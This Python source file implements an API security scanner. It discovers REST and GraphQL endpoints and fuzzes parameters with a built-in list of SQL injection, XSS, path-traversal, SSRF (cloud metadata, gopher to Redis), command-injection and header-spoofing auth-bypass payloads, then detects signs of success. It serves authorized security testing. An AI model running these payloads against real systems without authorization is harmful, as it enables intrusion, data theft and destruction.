"""API Security Scanner — OpenAPI/GraphQL/REST endpoint discovery and fuzzing.

Capabilities:
- OpenAPI/Swagger spec discovery and parsing
- GraphQL introspection and schema analysis
- REST endpoint discovery via crawling and wordlists
- Parameter fuzzing (SQLi, XSS, IDOR, SSRF)
- Auth bypass testing (BOLA, BFLA)
- Rate limit and DoS testing
"""
from __future__ import annotations

import json
import logging
import re
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Dict, List, Optional, Set

import requests

logger = logging.getLogger("AttackSurface.API")


@dataclass
class APIEndpoint:
    path: str
    method: str
    parameters: List[Dict[str, Any]]
    auth_required: bool
    summary: str
    source: str  # openapi, graphql, crawl, wordlist
    responses: Dict[str, Any]


@dataclass
class FuzzResult:
    endpoint: APIEndpoint
    param: str
    payload: str
    vuln_type: str  # sqli, xss, idor, ssrf, rce, auth_bypass
    evidence: str
    severity: str
    request: Dict[str, Any]
    response: Dict[str, Any]


class APIDiscovery:
    """Discover API endpoints from multiple sources."""

    def __init__(self, session: requests.Session = None, rate_limit: float = 1.0):
        self.session = session or requests.Session()
        self.session.headers.update({"User-Agent": "AttackSurfaceScanner/1.0"})
        self.rate_limit = rate_limit
        self.last_request = 0.0

    def _throttle(self):
        elapsed = time.time() - self.last_request
        if elapsed < self.rate_limit:
            time.sleep(self.rate_limit - elapsed)
        self.last_request = time.time()

    def discover_openapi(self, base_url: str, spec_paths: List[str] = None) -> List[APIEndpoint]:
        """Discover endpoints from OpenAPI/Swagger spec."""
        spec_paths = spec_paths or [
            "/openapi.json", "/swagger.json", "/api-docs", "/api/swagger.json",
            "/v1/openapi.json", "/v2/openapi.json", "/docs/openapi.json"
        ]
        endpoints = []

        for path in spec_paths:
            try:
                url = base_url.rstrip("/") + path
                self._throttle()
                resp = self.session.get(url, timeout=10)
                if resp.status_code == 200:
                    spec = resp.json()
                    endpoints.extend(self._parse_openapi_spec(spec, base_url))
                    logger.info("Found OpenAPI spec at %s: %d endpoints", url, len(endpoints))
                    break
            except Exception:
                continue

        return endpoints

    def _parse_openapi_spec(self, spec: Dict, base_url: str) -> List[APIEndpoint]:
        endpoints = []
        paths = spec.get("paths", {})
        for path, methods in paths.items():
            for method, details in methods.items():
                if method.upper() not in ("GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"):
                    continue
                params = []
                for p in details.get("parameters", []):
                    params.append({
                        "name": p.get("name"),
                        "in": p.get("in"),
                        "required": p.get("required", False),
                        "schema": p.get("schema", {}),
                        "description": p.get("description", "")
                    })
                # Request body parameters
                if "requestBody" in details:
                    content = details["requestBody"].get("content", {})
                    for ctype, cinfo in content.items():
                        if "schema" in cinfo:
                            params.append({
                                "name": "body",
                                "in": "body",
                                "required": details["requestBody"].get("required", False),
                                "schema": cinfo["schema"],
                                "content_type": ctype
                            })

                auth_required = bool(details.get("security"))
                endpoints.append(APIEndpoint(
                    path=path,
                    method=method.upper(),
                    parameters=params,
                    auth_required=auth_required,
                    summary=details.get("summary", ""),
                    source="openapi",
                    responses=details.get("responses", {})
                ))
        return endpoints

    def discover_graphql(self, base_url: str, endpoints: List[str] = None) -> List[APIEndpoint]:
        """Discover GraphQL schema via introspection."""
        endpoints = endpoints or ["/graphql", "/api/graphql", "/v1/graphql", "/query"]
        api_endpoints = []

        introspection_query = """
        query IntrospectionQuery {
          __schema {
            queryType { name }
            mutationType { name }
            subscriptionType { name }
            types {
              kind
              name
              description
              fields(includeDeprecated: true) {
                name
                description
                args {
                  name
                  description
                  type { kind name ofType { kind name ofType { kind name } } }
                }
                type { kind name ofType { kind name ofType { kind name } } }
              }
              inputFields {
                name
                description
                type { kind name ofType { kind name ofType { kind name } } }
              }
            }
          }
        }
        """

        for path in endpoints:
            try:
                url = base_url.rstrip("/") + path
                self._throttle()
                resp = self.session.post(url, json={"query": introspection_query}, timeout=15)
                if resp.status_code == 200:
                    data = resp.json()
                    if "data" in data and "__schema" in data["data"]:
                        api_endpoints.extend(self._parse_graphql_schema(data["data"]["__schema"], path))
                        logger.info("GraphQL introspection successful at %s: %d types", url, len(api_endpoints))
                        break
            except Exception as e:
                logger.debug("GraphQL discovery failed at %s: %s", path, e)

        return api_endpoints

    def _parse_graphql_schema(self, schema: Dict, endpoint_path: str) -> List[APIEndpoint]:
        endpoints = []
        for type_def in schema.get("types", []):
            if type_def.get("kind") not in ("OBJECT", "INPUT_OBJECT"):
                continue
            for field in type_def.get("fields", []) or []:
                params = []
                for arg in field.get("args", []):
                    arg_type = arg.get("type", {})
                    params.append({
                        "name": arg["name"],
                        "in": "query",
                        "required": arg_type.get("kind") == "NON_NULL",
                        "schema": {"type": arg_type.get("name") or arg_type.get("ofType", {}).get("name")},
                        "description": arg.get("description", "")
                    })
                endpoints.append(APIEndpoint(
                    path=endpoint_path,
                    method="POST",
                    parameters=params,
                    auth_required=False,  # GraphQL often has auth at resolver level
                    summary=f"GraphQL {type_def['name']}.{field['name']}",
                    source="graphql",
                    responses={}
                ))
        return endpoints

    def discover_rest_via_crawl(self, base_url: str, max_depth: int = 2) -> List[APIEndpoint]:
        """Discover REST endpoints by crawling the application."""
        from urllib.parse import urljoin, urlparse

        endpoints = []
        visited: Set[str] = set()
        to_visit = [base_url.rstrip("/") + "/"]

        api_patterns = [
            r"/api/", r"/v\d+/", r"/rest/", r"/graphql", r"\.json", r"\.xml"
        ]

        while to_visit and len(visited) < 100:
            url = to_visit.pop(0)
            if url in visited:
                continue
            visited.add(url)

            try:
                self._throttle()
                resp = self.session.get(url, timeout=10)
                if resp.status_code != 200:
                    continue

                # Check if this looks like an API
                content_type = resp.headers.get("Content-Type", "")
                if any(p in content_type for p in ["json", "xml", "api"]):
                    endpoints.append(APIEndpoint(
                        path=urlparse(url).path,
                        method="GET",
                        parameters=[],
                        auth_required=False,
                        summary="Discovered via crawl",
                        source="crawl",
                        responses={"200": {"description": "OK"}}
                    ))

                # Extract links
                if "html" in content_type:
                    links = re.findall(r'href=["\']([^"\']+)["\']', resp.text)
                    for link in links:
                        full = urljoin(url, link)
                        if urlparse(full).netloc == urlparse(base_url).netloc:
                            if any(re.search(p, full) for p in api_patterns):
                                to_visit.append(full)
            except Exception:
                continue

        return endpoints

    def discover_rest_via_wordlist(self, base_url: str, wordlist: List[str] = None) -> List[APIEndpoint]:
        """Discover REST endpoints using a wordlist."""
        wordlist = wordlist or [
            "/api/users", "/api/admin", "/api/login", "/api/register",
            "/api/products", "/api/orders", "/api/config", "/api/status",
            "/api/health", "/api/metrics", "/api/docs", "/api/v1",
            "/admin/api", "/v1/users", "/v1/auth", "/v1/data"
        ]

        endpoints = []
        for path in wordlist:
            try:
                url = base_url.rstrip("/") + path
                self._throttle()
                resp = self.session.get(url, timeout=5, allow_redirects=False)
                if resp.status_code in (200, 401, 403, 405):  # Exists
                    endpoints.append(APIEndpoint(
                        path=path,
                        method="GET",
                        parameters=[],
                        auth_required=resp.status_code in (401, 403),
                        summary=f"Wordlist discovery ({resp.status_code})",
                        source="wordlist",
                        responses={str(resp.status_code): {"description": resp.reason}}
                    ))
            except Exception:
                continue
        return endpoints


class APIFuzzer:
    """Fuzz API endpoints for common vulnerabilities."""

    PAYLOADS = {
        "sqli": [
            "' OR '1'='1", "' OR '1'='1' --", "'; DROP TABLE users; --",
            "1 UNION SELECT NULL,NULL,NULL--", "1' AND (SELECT COUNT(*) FROM users)>0--"
        ],
        "xss": [
            "<script>alert(1)</script>", "\"><script>alert(1)</script>",
            "javascript:alert(1)", "<img src=x onerror=alert(1)>",
            "'\"><svg/onload=alert(1)>"
        ],
        "idor": [
            "../admin", "../../etc/passwd", "/admin", "/api/users/1",
            "/api/orders/100", "/api/profile?id=1"
        ],
        "ssrf": [
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://localhost:22", "http://127.0.0.1:3306",
            "file:///etc/passwd", "gopher://127.0.0.1:6379/_INFO"
        ],
        "rce": [
            "; id", "| id", "`id`", "$(id)", "&& id",
            "; cat /etc/passwd", "| cat /etc/passwd"
        ],
        "auth_bypass": [
            {"header": "X-Original-URL", "value": "/admin"},
            {"header": "X-Rewrite-URL", "value": "/admin"},
            {"header": "X-Forwarded-For", "value": "127.0.0.1"},
            {"header": "X-Client-IP", "value": "127.0.0.1"},
        ]
    }

    def __init__(self, session: requests.Session = None):
        self.session = session or requests.Session()
        self.results: List[FuzzResult] = []

    def fuzz_endpoint(self, endpoint: APIEndpoint, vuln_types: List[str] = None) -> List[FuzzResult]:
        """Fuzz a single endpoint for specified vulnerability types."""
        vuln_types = vuln_types or ["sqli", "xss", "idor", "ssrf", "rce"]
        results = []

        # Test parameters
        for param in endpoint.parameters:
            param_name = param.get("name")
            param_in = param.get("in", "query")

            for vuln_type in vuln_types:
                if vuln_type not in self.PAYLOADS:
                    continue

                for payload in self.PAYLOADS[vuln_type][:3]:  # Limit per type
                    result = self._test_payload(endpoint, param_name, param_in, payload, vuln_type)
                    if result:
                        results.append(result)
                        self.results.append(result)

        # Test auth bypass (header-based)
        if "auth_bypass" in vuln_types:
            for bypass in self.PAYLOADS["auth_bypass"][:3]:
                result = self._test_auth_bypass(endpoint, bypass)
                if result:
                    results.append(result)
                    self.results.append(result)

        return results

    def _test_payload(self, endpoint: APIEndpoint, param_name: str, param_in: str,
                      payload: str, vuln_type: str) -> Optional[FuzzResult]:
        """Test a single payload against an endpoint parameter."""
        try:
            url = endpoint.path
            method = endpoint.method
            headers = {"Content-Type": "application/json"}
            params = {}
            data = {}

            if param_in == "query":
                params[param_name] = payload
            elif param_in == "body":
                data = {param_name: payload}
            elif param_in == "path":
                url = url.replace(f"{{{param_name}}}", payload)

            self.session.headers.update(headers)
            start = time.time()
            if method == "GET":
                resp = self.session.get(url, params=params, timeout=10)
            elif method in ("POST", "PUT", "PATCH"):
                resp = self.session.request(method, url, params=params, json=data, timeout=10)
            else:
                return None
            elapsed = time.time() - start

            # Analyze response for vulnerability indicators
            evidence = self._check_vulnerability(resp, payload, vuln_type, elapsed)
            if evidence:
                return FuzzResult(
                    endpoint=endpoint,
                    param=param_name,
                    payload=payload,
                    vuln_type=vuln_type,
                    evidence=evidence,
                    severity=self._assess_severity(vuln_type, evidence),
                    request={"url": url, "method": method, "params": params, "data": data},
                    response={"status": resp.status_code, "body": resp.text[:500], "time": elapsed}
                )
        except Exception as e:
            logger.debug("Fuzz test failed: %s", e)
        return None

    def _test_auth_bypass(self, endpoint: APIEndpoint, bypass: Dict) -> Optional[FuzzResult]:
        """Test authentication bypass via header manipulation."""
        try:
            headers = {bypass["header"]: bypass["value"]}
            url = endpoint.path
            self.session.headers.update(headers)
            resp = self.session.get(url, timeout=10)

            if resp.status_code == 200 and "admin" in resp.text.lower():
                return FuzzResult(
                    endpoint=endpoint,
                    param=bypass["header"],
                    payload=bypass["value"],
                    vuln_type="auth_bypass",
                    evidence=f"Admin content accessible via {bypass['header']}",
                    severity="high",
                    request={"url": url, "headers": headers},
                    response={"status": resp.status_code, "body": resp.text[:500]}
                )
        except Exception:
            pass
        return None

    def _check_vulnerability(self, resp: requests.Response, payload: str,
                            vuln_type: str, elapsed: float) -> Optional[str]:
        """Check response for vulnerability indicators."""
        body = resp.text.lower()

        if vuln_type == "sqli":
            indicators = ["sql syntax", "mysql", "postgresql", "oracle", "sqlite",
                          "syntax error", "unclosed quotation", "unterminated string"]
            if any(ind in body for ind in indicators):
                return f"SQL error detected with payload: {payload}"
            if elapsed > 5:  # Time-based blind SQLi
                return f"Possible time-based SQLi (response time: {elapsed:.1f}s)"

        elif vuln_type == "xss":
            if payload.lower() in body and "<script" in payload.lower():
                return f"XSS payload reflected: {payload}"

        elif vuln_type == "idor":
            indicators = ["unauthorized", "forbidden", "access denied", "not found"]
            if resp.status_code == 200 and not any(ind in body for ind in indicators):
                return f"Possible IDOR - accessed resource with payload: {payload}"

        elif vuln_type == "ssrf":
            indicators = ["ami-id", "instance-id", "meta-data", "user-data",
                          "169.254.169.254", "metadata.google.internal"]
            if any(ind in body for ind in indicators):
                return f"SSRF successful - cloud metadata leaked: {payload}"

        elif vuln_type == "rce":
            indicators = ["uid=", "gid=", "groups=", "root:", "bin/bash", "windows"]
            if any(ind in body for ind in indicators):
                return f"Possible RCE - command output detected: {payload}"

        return None

    def _assess_severity(self, vuln_type: str, evidence: str) -> str:
        critical_types = {"rce", "ssrf", "auth_bypass"}
        high_types = {"sqli", "idor"}
        if vuln_type in critical_types:
            return "critical"
        if vuln_type in high_types:
            return "high"
        if vuln_type == "xss":
            return "medium"
        return "low"